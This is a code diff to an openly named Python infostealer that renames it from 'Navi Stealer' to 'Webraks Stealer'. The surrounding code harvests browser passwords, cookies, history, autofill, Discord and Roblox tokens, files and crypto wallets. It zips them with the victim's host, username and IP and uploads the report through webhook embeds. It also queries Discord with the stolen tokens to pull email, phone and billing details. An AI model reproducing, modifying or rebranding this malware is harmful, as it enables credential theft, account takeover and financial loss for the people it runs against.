@@ -1,10 +1,3 @@
-import os, sys, json, re, shutil, sqlite3, zipfile, subprocess, threading, platform, base64, socket, uuid, ctypes, traceback
-from datetime import datetime, timezone
-try: 
-    import requests
-except ImportError:
-    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests", "-q"])
-    import requests
 try: 
     import win32crypt
 except ImportError:
@@ -117,16 +110,16 @@ def roblox_sex():
                         fields.append({"name": f"Token Part {idx+1}/{len(chunks)}", "value": f"```\n{chunk}\n```", "inline": False})
                 else:
                     fields.append({"name": "Token", "value": f"```\n{token}\n```", "inline": False})
-                gh = "https://github.com/glockinhand"
+                gh = "https://github.com/w3br4ks"
                 payload = {
                     "embeds": [{
-                        "username": "Navi Stealer",
+                        "username": "Webraks Stealer",
                         "avatar_url": "https://i.ibb.co/0R0MPTwz/avatars-000615381687-t475ap-t240x240-removebg-preview.png",
                         "title": "<:2978robloxlogo:1509632404665401506> Roblox Account Captured",
                         "color": color,
                         "thumbnail": {"url": info["avatar_url"]},
                         "fields": fields,
-                        "footer": {"text": f"Navi Multitool | {gh}"}
+                        "footer": {"text": f"Webraks Multitool | {gh}"}
                     }]
                 }
                 try:
@@ -140,10 +133,10 @@ def roblox_sex():
     else:
         print("[!]")
 
-class NaviRecovery:
+class WebraksRecovery:
     def __init__(self):
         self.res = []
-        self._log("Initializing Navi...")
+        self._log("Initializing Webraks...")
         self.user = os.getlogin()
         self.tmp = os.path.join(os.getenv("TEMP"), f"n_{uuid.uuid4().hex[:6]}")
         if not os.path.exists(self.tmp): os.makedirs(self.tmp)
@@ -537,19 +530,19 @@ class NaviRecovery:
     def rep_send(self):
         try:
             self._log("Creating ZIP archive...")
-            _zn = f"Navi_Report_{self.user}.zip"; _zp = os.path.join(os.getenv("TEMP"), _zn)
+            _zn = f"Webraks_Report_{self.user}.zip"; _zp = os.path.join(os.getenv("TEMP"), _zn)
             with zipfile.ZipFile(_zp, 'w') as zf:
                 for r, d, fs in os.walk(self.tmp):
                     for f in fs: zf.write(os.path.join(r, f), os.path.relpath(os.path.join(r, f), self.tmp))
             
             self._log("Uploading report...")
-            gh = "https://github.com/glockinhand"
+            gh = "https://github.com/w3br4ks"
             from json import loads
             from urllib.request import Request, urlopen
             _st = f"🔑 **Passwords:** `{self.totals['pass']}`\n🍪 **Cookies:** `{self.totals['cook']}`\n📜 **History:** `{self.totals['hist']}`\n📝 **Autofill:** `{self.totals['auto']}`\n<:discordroundcoloricon:1505919320926978199> **Discord:** `{self.totals['disc']}`\n📂 **Files:** `{self.totals['file']}`\n<:1425bitcoin:1505919497356185730> **Wallets:** `{self.totals['wall']}`"
             if self.totals["game"]: _st += f"\n🎮 **Games:** `{', '.join(self.totals['game'])}`"
             _fields = [{"name": "<:2899info:1505918643433635850> User Info", "value": f"```Host: {self.sys_info.get('PC')}\nUser: {self.sys_info.get('User')}\nIP: {self.sys_info.get('IP')}```", "inline": True}, {"name": "💻 System", "value": f"```OS: {self.sys_info.get('OS')}\nRAM: {self.sys_info.get('RAM')}\nGPU: {self.sys_info.get('GPU')}```", "inline": True}, {"name": "📊 Stats", "value": _st, "inline": False}]
-            _main_emb = {"title": "<a:12705eyes:1505917648507109508> Navi Stealer Report", "url": gh, "color": 0x00A3FF, "thumbnail": {"url": "https://i.ibb.co/0R0MPTwz/avatars-000615381687-t475ap-t240x240-removebg-preview.png"}, "fields": _fields, "footer": {"text": f"Navi Multitool | {gh}", "icon_url": "https://i.ibb.co/Wv94YGVx/webraks.png"}, "timestamp": datetime.now(timezone.utc).isoformat()}
+            _main_emb = {"title": "<a:12705eyes:1505917648507109508> Webraks Stealer Report", "url": gh, "color": 0x00A3FF, "thumbnail": {"url": "https://i.ibb.co/0R0MPTwz/avatars-000615381687-t475ap-t240x240-removebg-preview.png"}, "fields": _fields, "footer": {"text": f"Webraks Multitool | {gh}", "icon_url": "https://i.ibb.co/Wv94YGVx/webraks.png"}, "timestamp": datetime.now(timezone.utc).isoformat()}
             _embeds = [_main_emb]
             for t in self.tokens[:9]:
                 h = {"Authorization": t["t"], "Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"}
@@ -559,7 +552,7 @@ class NaviRecovery:
                 uid = userjson.get("id")
                 pfp = f"https://cdn.discordapp.com/avatars/{uid}/{pic}" if pic is not None else "https://i.ibb.co/0R0MPTwz/avatars-000615381687-t475ap-t240x240-removebg-preview.png"
                 _embeds.append({"title": f"<a:12705eyes:1505917648507109508> Token Info: {t['u']}", "color": 0x00A3FF, "thumbnail": {"url": pfp}, "fields": [{"name": ":id: ID:", "value": f"`{t['id']}`", "inline": True}, {"name": "<a:Invite9:1505916245445312592> Email:", "value": f"`{t['e']}`", "inline": True}, {"name": "📱 Phone:", "value": f"`{t['p']}`", "inline": True}, {"name": "<a:50534diamond:1505916198850658376> Nitro:", "value": t['n'], "inline": False}, {"name": "<a:Ver_money83:1505916176776171591> Billing:", "value": t['b'], "inline": False}, {"name": "<a:Rocket:1505916279477768203> Token:", "value": f"``` {t['t']} ```", "inline": False}]})
-            _pj = {"content": "@everyone" if _SET["ping"] else "", "embeds": _embeds, "username": "Navi Stealer", "avatar_url": "https://i.ibb.co/0R0MPTwz/avatars-000615381687-t475ap-t240x240-removebg-preview.png"}
+            _pj = {"content": "@everyone" if _SET["ping"] else "", "embeds": _embeds, "username": "Webraks Stealer", "avatar_url": "https://i.ibb.co/0R0MPTwz/avatars-000615381687-t475ap-t240x240-removebg-preview.png"}
             
             if os.path.getsize(_zp) > 8 * 1024 * 1024:
                 try:
@@ -618,6 +611,6 @@ class NaviRecovery:
 
 if __name__ == "__main__":
     try:
-        NaviRecovery().run()
+        WebraksRecovery().run()
         roblox_sex()
     except: pass
